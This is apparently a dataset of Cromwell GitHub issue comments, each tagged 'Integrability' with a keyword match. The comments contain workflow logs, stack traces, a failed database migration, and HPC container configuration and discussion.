Integrability,"l-system-akka.actor.default-dispatcher-11 INFO - WorkflowManagerActor submitWorkflow input id = Some(ea0272fc-42ef-4852-8143-8b14d34bfd8a), effective id = ea0272fc-42ef-4852-8143-8b14d34bfd8a; 2016-04-26 18:26:08,772 cromwell-system-akka.actor.default-dispatcher-10 INFO - Updating WorkflowManager state. New Data: (ea0272fc-42ef-4852-8143-8b14d34bfd8a,Actor[akka://cromwell-system/user/WorkflowManagerActor/WorkflowActor-ea0272fc-42ef-4852-8143-8b14d34bfd8a#787056469]); 2016-04-26 18:26:08,773 cromwell-system-akka.actor.default-dispatcher-3 INFO - WorkflowActor [UUID(ea0272fc)]: Restart message received; 2016-04-26 18:26:09,112 cromwell-system-akka.actor.default-dispatcher-11 INFO - WorkflowActor [UUID(ea0272fc)]: Initial symbols:. 2016-04-26 18:26:09,129 cromwell-system-akka.actor.default-dispatcher-11 INFO - WorkflowActor [UUID(ea0272fc)]: Initial executions:. 2016-04-26 18:26:09,156 cromwell-system-akka.actor.default-dispatcher-2 INFO - WorkflowActor [UUID(ea0272fc)]: ExecutionStoreCreated(Restart) message received; 2016-04-26 18:26:09,432 cromwell-system-akka.actor.default-dispatcher-11 INFO - WorkflowActor [UUID(ea0272fc)]: Beginning transition from Submitted to Running.; 2016-04-26 18:26:09,432 cromwell-system-akka.actor.default-dispatcher-11 INFO - WorkflowActor [UUID(ea0272fc)]: transitioning from Submitted to Running.; 2016-04-26 18:26:09,646 cromwell-system-akka.actor.default-dispatcher-7 INFO - WorkflowActor [UUID(ea0272fc)]: starting calls: GenomeStripBamWorkflow.ComputeMetadata, GenomeStripBamWorkflow.ComputeStatistics; 2016-04-26 18:26:09,646 cromwell-system-akka.actor.default-dispatcher-7 INFO - WorkflowActor [UUID(ea0272fc)]: persisting status of ComputeStatistics to Starting.; 2016-04-26 18:26:09,657 cromwell-system-akka.actor.default-dispatcher-7 INFO - WorkflowActor [UUID(ea0272fc)]: persisting status of ComputeMetadata to Starting. 2016-04-26 18:26:09,845 cromwell-system-akka.actor.default-dispatcher-11 ERROR - WorkflowActor [UUID(ea0272fc)]: Could ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/588#issuecomment-215113251:1582,message,message,1582,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/588#issuecomment-215113251,1,['message'],['message']
Integrability,"la:34); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1(ServicesStore.scala:11); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1$adapted(ServicesStore.scala:11); 	at cromwell.database.slick.SlickDatabase.$anonfun$withConnection$1(SlickDatabase.scala:155); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:70); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:69); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275); 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 	at java.lang.Thread.run(Thread.java:748); Caused by: liquibase.exception.DatabaseException: Unknown column '%failures[%]%:failure' in 'where clause' [Failed SQL: UPDATE METADATA_ENTRY; SET METADATA_KEY = CONCAT(TRIM(TRAILING ':failure' FROM METADATA_KEY), "":message""); WHERE METADATA_KEY LIKE ""%failures[%]%:failure""]; 	at liquibase.executor.jvm.JdbcExecutor$ExecuteStatementCallback.doInStatement(JdbcExecutor.java:309); 	at liquibase.executor.jvm.JdbcExecutor.execute(JdbcExecutor.java:55); 	at liquibase.executor.jvm.JdbcExecutor.execute(JdbcExecutor.java:113); 	at liquibase.database.AbstractJdbcDatabase.execute(AbstractJdbcDatabase.java:1277); 	at liquibase.database.AbstractJdbcDatabase.executeStatements(AbstractJdbcDatabase.java:1259); 	at liquibase.changelog.ChangeSet.execute(ChangeSet.java:582); 	... 16 common frames omitted; Caused by: com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: Unknown column '%failures[%]%:failure' in 'where clause'; 	at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method); 	at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62); 	at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(D",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459580103:2901,message,message,2901,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459580103,1,['message'],['message']
Integrability,lde$2(RouteConcatenation.scala:47); 	at akka.http.scaladsl.util.FastFuture$.strictTransform$1(FastFuture.scala:41); 	at akka.http.scaladsl.util.FastFuture$.transformWith$extension1(FastFuture.scala:45); 	at akka.http.scaladsl.util.FastFuture$.flatMap$extension(FastFuture.scala:26); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$1(RouteConcatenation.scala:44); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$1(RouteConcatenation.scala:44); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$mapRouteResultWith$2(BasicDirectives.scala:72); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$textract$2(BasicDirectives.scala:159); 	at akka.http.scaladsl.server.directives.ExecutionDirectives.$anonfun$handleExceptions$2(ExecutionDirectives.scala:32); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$textract$2(BasicDirectives.scala:159); 	at akka.http.scaladsl.server.Route$.$anonfun$asyncHandler$1(Route.scala:86); 	at akka.stream.impl.fusing.MapAsyncUnordered$$anon$26.onPush(Ops.scala:1303); 	at akka.stream.impl.fusing.GraphInterpreter.processPush(GraphInterpreter.scala:519); 	at akka.stream.impl.fusing.GraphInterpreter.execute(GraphInterpreter.scala:411); 	at akka.stream.impl.fusing.GraphInterpreterShell.runBatch(ActorGraphInterpreter.scala:588); 	at akka.stream.impl.fusing.GraphInterpreterShell$AsyncInput.execute(ActorGraphInterpreter.scala:472); 	at akka.stream.impl.fusing.GraphInterpreterShell.processEvent(ActorGraphInterpreter.scala:563); 	at akka.stream.impl.fusing.ActorGraphInterpreter.akka$stream$impl$fusing$ActorGraphInterpreter$$processEvent(ActorGraphInterpreter.scala:745); 	at akka.stream.impl.fusing.ActorGraphInterpreter$$anonfun$receive$1.applyOrElse(ActorGraphInterpreter.scala:760); 	at akka.actor.Actor.aroundReceive(Actor.scala:517); 	at akka.actor.Actor.aroundReceive$(Actor.scala:515); 	at akka.stream.impl.fusing.ActorGraphInterpreter.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467133187:4034,Rout,Route,4034,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467133187,1,['Rout'],['Route']
Integrability,looks like the jenkins script needed to forcibly install newer versions of all dependencies. Looks to be fixed now,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3973#issuecomment-412161507:79,depend,dependencies,79,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3973#issuecomment-412161507,1,['depend'],['dependencies']
Integrability,"lop a full API; > for services. It meets the criteria for both a backend and an executable,; > and this is because it can be conceptualized as both ""a thing that you run""; > and ""the thing that is the container you run in."" But it's confusing. The; > distinction is that although Singularity is also a container, Singularity; > is *not* like Docker because it doesn't have the fully developed services; > API (yet!). This problem is hard because the language for Singularity; > containers communicating between one another, and even to the host, is not; > completely implemented yet. This comes down to OCI compliance, and having a; > way for some host to manage all of its Singularity containers. Right now we; > just have start and stop, but we can't connect containers, define ports, or; > even easily get a PID. It could (sort of?) be hacked, but we would be; > better off waiting for that nice standard.; > Reproducible Binary (Workflow Step) vs. Environment; >; > There is also a distinction that I haven't completely wrapped my head; > around. Docker is very commonly used as an environment - you put a bunch of; > software (e.g., samtools, bwa aligner, etc.) and then issue commands to the; > container with custom things. Singularity, in my mind, to be truly a; > reproducible thing is more of the workflow step or script. It will have the; > software inside, but better should have those same commands represented; > with internal modularity. I could arguably completely do away with the; > external workflow dependency if a single binary told me how to run itself,; > and then had more than one entrypoint defined for each step. I wouldn't; > need to care about the software or components inside because my host just; > needs to run Singularity. A container should almost be more like a hard; > coded binary step instead of a ""come into the environment and play around,; > the water's fine!"" It's a little bit like the ICD 10 decision to give a; > unique id to every combination of things (",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-441126046:6452,wrap,wrapped,6452,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-441126046,1,['wrap'],['wrapped']
Integrability,"lush with batch size 200 and process rate 5 seconds.; [2018-10-23 17:49:22,13] [info] WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-10-23 17:49:22,22] [info] CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; [2018-10-23 17:49:23,62] [info] JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; [2018-10-23 17:49:23,67] [info] SingleWorkflowRunnerActor: Version 37-634ac5b-SNAP; [2018-10-23 17:49:23,68] [info] SingleWorkflowRunnerActor: Submitting workflow; [2018-10-23 17:49:23,76] [info] CWL (v1.0) workflow d186ca94-b85b-4729-befc-8ad28a05976c submitted; [2018-10-23 17:49:23,80] [info] SingleWorkflowRunnerActor: Workflow submitted d186ca94-b85b-4729-befc-8ad28a05976c; [2018-10-23 17:49:23,80] [info] 1 new workflows fetched; [2018-10-23 17:49:23,81] [info] WorkflowManagerActor Starting workflow d186ca94-b85b-4729-befc-8ad28a05976c; [2018-10-23 17:49:23,83] [info] WorkflowManagerActor Successfully started WorkflowActor-d186ca94-b85b-4729-befc-8ad28a05976c; [2018-10-23 17:49:23,84] [info] Retrieved 1 workflows from the WorkflowStoreActor; [2018-10-23 17:49:23,84] [warn] SingleWorkflowRunnerActor: received unexpected message: Done in state RunningSwraData; [2018-10-23 17:49:23,88] [info] WorkflowStoreHeartbeatWriteActor configured to flush with batch size 10000 and process rate 2 minutes.; [2018-10-23 17:49:23,97] [info] MaterializeWorkflowDescriptorActor [d186ca94]: Parsing workflow as CWL v1.0; [2018-10-23 17:49:24,53] [error] WorkflowManagerActor Workflow d186ca94-b85b-4729-befc-8ad28a05976c failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Custom type file:///home/jeremiah/code/gdc-dnaseq-cwl/workflows/bamfastq_align/test_pack.cwl#capture_kit.yml/capture_kit was referred to but not found in schema def SchemaDefRequirement([Lshapeless.$colo",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-432449856:4087,message,message,4087,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-432449856,1,['message'],['message']
Integrability,mapRouteResult$2(BasicDirectives.scala:66); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$textract$2(BasicDirectives.scala:159); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$mapRouteResult$2(BasicDirectives.scala:66); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$textract$2(BasicDirectives.scala:159); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$mapRequestContext$2(BasicDirectives.scala:43); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$textract$2(BasicDirectives.scala:159); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$2(RouteConcatenation.scala:47); 	at akka.http.scaladsl.util.FastFuture$.strictTransform$1(FastFuture.scala:41); 	at akka.http.scaladsl.util.FastFuture$.transformWith$extension1(FastFuture.scala:45); 	at akka.http.scaladsl.util.FastFuture$.flatMap$extension(FastFuture.scala:26); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$1(RouteConcatenation.scala:44); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$1(RouteConcatenation.scala:44); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$2(RouteConcatenation.scala:47); 	at akka.http.scaladsl.util.FastFuture$.strictTransform$1(FastFuture.scala:41); 	at akka.http.scaladsl.util.FastFuture$.transformWith$extension1(FastFuture.scala:45); 	at akka.http.scaladsl.util.FastFuture$.flatMap$extension(FastFuture.scala:26); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$1(RouteConcatenation.scala:44); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$mapRequestContext$2(BasicDirectives.scala:43); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$textract$2(BasicDirectives.scala:159); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$2(RouteConcatenati,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467133187:2038,Rout,RouteConcatenation,2038,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467133187,2,['Rout'],"['RouteConcatenation', 'RouteWithConcatenation']"
Integrability,"mit jobs to other docker or singularity containers) is because of having the docker/singularity submit come from inside the container. We don't really want to do that anyway, because there is a double dependency. But on the other hand, we want to provide reproducible solutions, meaning that things are container based. In an ideal setup, I would have some (still container based) cromwell acting as more of a docker-compose setup, and issuing commands to other containers. Ideally there would be one maintained Docker container for a step in a pipeline, and then if it's run on an HPC resource (where you can't have docker) it would just be dumped into singularity (`docker://<username>/<reponame>`). But this case is a little different - I'm just talking about the cromwell ""plugin"". I don't actually understand why this is necessary, at least given that singularity containers can act like executable. If I want to run a python script, I run it in the command section, as an executable. I don't require a python plugin. Now given that Singularity changes so that we want to take advantage of more of the instance commands (e.g., we can start, stop, get a status) this might make it more like docker and warrant a plugin. But for now, it's not quite there, and making a plugin would just be a really fancy interface to run an executable. Does this make sense?. > @vsoch you're obviously well versed in all things Singularity - do you see any utility to defining the use of a Singularity container in the WDL (ie no matter what this task should always use Singularity) or is it going to be more of a site specific situation, like hwat you're showing here?. I don't think it would be site specific (if the container is singularity, it would largely be the same, a container_uri and then some args to it). The only reason I have two sections is because I was trying out two ways to do it. Neither of them fully work (at least according to cromwell) because I don't know what that job_id business it :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-412171685:1837,interface,interface,1837,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-412171685,1,['interface'],['interface']
Integrability,"munshi ran successfully in 661ms; 2019-01-31 19:38:58,563 ERROR - changelog.xml: changesets/failure_metadata.xml::failure_to_message::cjllanwarne: Change Set changesets/failure_metadata.xml::failure_to_message::cjllanwarne failed. Error: Unknown column '%failures[%]%:failure' in 'where clause' [Failed SQL: UPDATE METADATA_ENTRY; SET METADATA_KEY = CONCAT(TRIM(TRAILING ':failure' FROM METADATA_KEY), "":message""); WHERE METADATA_KEY LIKE ""%failures[%]%:failure""]; 2019-01-31 19:38:58,618 INFO - changesets/failure_metadata.xml::failure_to_message::cjllanwarne: Successfully released change log lock; 2019-01-31 19:38:58,637 ERROR - Failed to instantiate Cromwell System. Shutting down Cromwell.; liquibase.exception.MigrationFailedException: Migration failed for change set changesets/failure_metadata.xml::failure_to_message::cjllanwarne:; Reason: liquibase.exception.DatabaseException: Unknown column '%failures[%]%:failure' in 'where clause' [Failed SQL: UPDATE METADATA_ENTRY; SET METADATA_KEY = CONCAT(TRIM(TRAILING ':failure' FROM METADATA_KEY), "":message""); WHERE METADATA_KEY LIKE ""%failures[%]%:failure""]; 	at liquibase.changelog.ChangeSet.execute(ChangeSet.java:619); 	at liquibase.changelog.visitor.UpdateVisitor.visit(UpdateVisitor.java:51); 	at liquibase.changelog.ChangeLogIterator.run(ChangeLogIterator.java:79); 	at liquibase.Liquibase.update(Liquibase.java:214); 	at liquibase.Liquibase.update(Liquibase.java:192); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:62); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:34); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1(ServicesStore.scala:11); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1$adapted(ServicesStore.scala:11); 	at cromwell.database.slick.SlickDatabase.$anonfun$withConnection$1(SlickDatabase.scala:155); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.sc",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459580103:1282,message,message,1282,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459580103,1,['message'],['message']
Integrability,"nfig. ### The results. The following execution strings can be inserted into the two container configs:; - Singularity: `singularity exec --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${script}`; - udocker: `udocker run ${""--user "" + docker_user} --rm -v ${cwd}:${docker_cwd} ${docker} ${script}`. My _container_ config template for no workflow manager:; ```HOCON; include required(classpath(""application"")). # uncomment if using udocker; # docker.hash-lookup.enabled = false. backend {; default: singularity; providers: {; singularity {; # The backend custom configuration.; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; run-in-background = true; # The list of possible runtime custom attributes.; runtime-attributes = """"""; String? docker; String? docker_user; """"""; # Submit string when there is a ""docker"" runtime attribute.; submit-docker = """"""; ## PLACE THE CORRECT CONTAINER COMMAND HERE ##; """"""; }; }; }; }; ```. And applied for something like SLURM:; ```HOCON; include required(classpath(""application"")). # uncomment if using udocker; # docker.hash-lookup.enabled = false. backend {; default: SLURM; providers: {; SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; runtime-attributes = """"""; Int runtime_minutes = 600; Int cpus = 2; Int requested_memory_mb_per_core = 8000; String? queue; String? docker; String? docker_user; """"""; # you should have a submit script as well, ; submit-docker = """"""; sbatch -J ${job_name} -D ${cwd} -o ${cwd}/execution/stdout -e ${cwd}/execution/stderr ${""-p "" + queue} \; -t ${runtime_minutes} ${""-c "" + cpus} --mem-per-cpu=${requested_memory_mb_per_core} \; --wrap ""## PLACE THE CORRECT CONTAINER COMMAND HERE ##""; """"""; kill = ""scancel ${job_id}""; check-alive = ""squeue -j ${job_id}""; job-id-regex = ""Submitted batch job (\\d+).*""; }; }; }; }; ```. Thanks everyone for the comments above. Edit: Correct mistype: `String queue? → String? queue`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461275840:4006,wrap,wrap,4006,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461275840,1,['wrap'],['wrap']
Integrability,nsformWith$extension1(FastFuture.scala:45); 	at akka.http.scaladsl.util.FastFuture$.flatMap$extension(FastFuture.scala:26); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$1(RouteConcatenation.scala:44); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$mapRequestContext$2(BasicDirectives.scala:43); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$textract$2(BasicDirectives.scala:159); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$2(RouteConcatenation.scala:47); 	at akka.http.scaladsl.util.FastFuture$.strictTransform$1(FastFuture.scala:41); 	at akka.http.scaladsl.util.FastFuture$.transformWith$extension1(FastFuture.scala:45); 	at akka.http.scaladsl.util.FastFuture$.flatMap$extension(FastFuture.scala:26); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$1(RouteConcatenation.scala:44); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$1(RouteConcatenation.scala:44); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$mapRouteResultWith$2(BasicDirectives.scala:72); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$textract$2(BasicDirectives.scala:159); 	at akka.http.scaladsl.server.directives.ExecutionDirectives.$anonfun$handleExceptions$2(ExecutionDirectives.scala:32); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$textract$2(BasicDirectives.scala:159); 	at akka.http.scaladsl.server.Route$.$anonfun$asyncHandler$1(Route.scala:86); 	at akka.stream.impl.fusing.MapAsyncUnordered$$anon$26.onPush(Ops.scala:1303); 	at akka.stream.impl.fusing.GraphInterpreter.processPush(GraphInterpreter.scala:519); 	at akka.stream.impl.fusing.GraphInterpreter.execute(GraphInterpreter.scala:411); 	at akka.stream.impl.fusing.GraphInterpreterShell.runBatch(ActorGraphInterpreter.scala:588); 	at akka.stream.impl.fusing.GraphInterpreterShell$AsyncInput.execute(,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467133187:3470,Rout,RouteConcatenation,3470,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467133187,2,['Rout'],"['RouteConcatenation', 'RouteWithConcatenation']"
Integrability,"nt relatively smoothly. Because of some outside factors we decided to change this task to instead output ~3000 files in the glob. After about 13000 tasks were processed(Sucess -> Done) we started seeing some slow down that coincided with errors in the logs like the following:. ```; 2016-08-03 03:34:04,971 cromwell-system-akka.actor.default-dispatcher-51 WARN - Caught exception, retrying: Remote host closed connection during handshake; javax.net.ssl.SSLHandshakeException: Remote host closed connection during handshake; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:992) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1375) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1403) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1387) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559) ~[na:1.8.0_72]; at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:153) ~[na:1.8.0_72]; at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:93) ~[cromwell.jar:0.19]; at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:972) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:419) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469) ~[cromwell.jar:0.19]; at cromwell.engine.backend.io.filesystem.gcs.GcsFileSystemProvider$$anonfun$3.apply(GcsFileSystemProvider.scala:242) ~[cromwell.jar:0.19",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:1229,protocol,protocol,1229,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['protocol'],['protocol']
Integrability,"o every combination of things (e.g., ""got hit on the road by a; > chicken"") instead of combinations of them, eg. (""got hit"" + ""by chicken"").; > The first is harder because you represent more things (more containers),; > but the second isn't reproducible because if you lose ""by chicken"" you've; > lost the entire workflow. Does that make sense?; > What can/should we do now?; >; > So there are two things to think about. With the current representation of; > a workflow, we would want Singularity to be OCI compliant, and I would; > propose a plan to move forward is to expect this, and contribute to; > Singularity itself with the mindset of ""I want this to plug into AWS"" or ""I; > want this to plug into Kubernetes,"" etc. The backends for HPC are going to; > be good to go with just a SLURM or SGE backend, and then commands to load; > and run/exec a Singularity container. When the time comes and Singularity; > supports services, then we can start to develop (I think) the singularity; > backend configuration for cromwell, with clean commands to get statuses,; > start and stop, and otherwise integrate into the software. You guys seem; > pretty busy, so likely your best bet would be to just wait, because the; > community is going in that direction anyway.; >; > The other representation is to rethink this. An approach that I like is to; > move away from micro managing the workflow / software, and to set; > requirements for the data. If you set standard formats (meaning everything; > from the organization of files down to the headers of a data file) on the; > data itself, then the software gets built around that. A researcher can; > have confidence that the data he is collecting will work with software; > because it's validated to the format. The developers can have confidence; > their tools will work with data because of that same format. A new graduate; > student knows how to develop a new tool because there are nicely defined; > rules. A good example is to look at the BIDS (bra",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-441126046:8496,integrat,integrate,8496,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-441126046,1,['integrat'],['integrate']
Integrability,"o review the changelog. In this case, we're going from `0.61.0-alpha` to `0.124.8` which is a large jump, but that doesn't tell the whole story. * This looks like a lot of releases to check. For sure, checking every release manually is not practical; we'll have to rely on their release notes.; * Until `0.120.0`, this library used to be included in a [monorepo-ish repo of Java libraries](https://github.com/googleapis/google-cloud-java) which appears to have had a regular 2-week release cycle. Not every release had changes to the `google-storage-nio` library. In fact, browsing the release notes, I found only a handful that mentioned changes to storage NIO. These all looked very innocent to me.; * After `0.120.0`, the library code moved to its own [repo](https://github.com/googleapis/java-storage-nio). Releases there have been less frequent and more irregularly scheduled, but still largely consist of dependency updates. (It's possible that _those_ dependency updates introduce unexpected behaviors in `java-storage-nio`, but there's only so much we can audit).; * Cromwell was briefly running with `0.123.8` until the bug mentioned here was discovered. Not knowing when that bug was introduced, we rolled all the way back. Now, we are pretty confident that it was introduced in [`0.122.0`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.122.0) and fixed in [`0.123.13`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.13).; * Again looking at releases that are not just dependency updates, nearly all of the changes look very innocent to me. In fact, updating to at least [`0.123.23`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.23) will give us the benefit of a [fix](https://github.com/googleapis/java-storage-nio/pull/841) to a requester-pays problem that we encountered ourselves.; * There's only one other post-`0.120.0` [change](https://github.com/googleapis/java-storage-nio/pull/774) (in [`0.123.18`](https://github.com/goog",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452:1027,depend,dependency,1027,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452,1,['depend'],['dependency']
Integrability,"o what they do (e.g., `dockersave`. Some quick learnings:. Let's say we create a defaults section that looks like this, to set some shared environment variables, working directory, docker container, anything we want really:. ```; defaults: &defaults; docker:; - image: docker:18.01.0-ce-git; working_directory: /tmp/src; ```. This syntax says ""find the section defined as defaults (above) and insert it here. ```; <<: *defaults; ```; so you don't write it twice!. This is similar, but it's like a named anchor and pointer. I might have this under a jobs step. ```; - run: *dothething; ```; which might be in reference to this. ```; dothething: &dothething; name: Do the thing; command: |; echo ""Do the thing!""; echo ""Do it again!""; ```. - The main runtime in the file is the workflow jobs section, which just does a build and deploy.; - the base container that is run is one of circle's ready to docker docker images `docker:18.01.0-ce-git`; - The main steps are to load cache, install dependencies, build the container, run to test, and then save the cache and deploy. That's really it :); - you interact with the environment by writing it to `BASH_ENV` and sourcing that, which needs to be done in each step separately (e.g., a ""run"" section); - most of the weird if statement logic is just to test if the user (you) has defined an environment variable (somewhere) and if not, go to default or just skip a step.; - the easiest way to ""read"" the file is to go to the bottom and start at ""workflows"" that describe the highest level of things, e.g. ""run all these steps under build, and trigger based on these filters and branches."" TLDR **workflows** define a dependency graph sort of deal.; - The details for the steps for each workflow are under ""jobs"" that are the seconds above that, so the names of jobs are going to correspond to workflows. In ""jobs"" you can then trace back up to find the corresponding step. TLDR **jobs** are all the steps of stuff to do.; - Steps that aren't found (e.g., ch",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-415952635:2037,depend,dependencies,2037,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-415952635,1,['depend'],['dependencies']
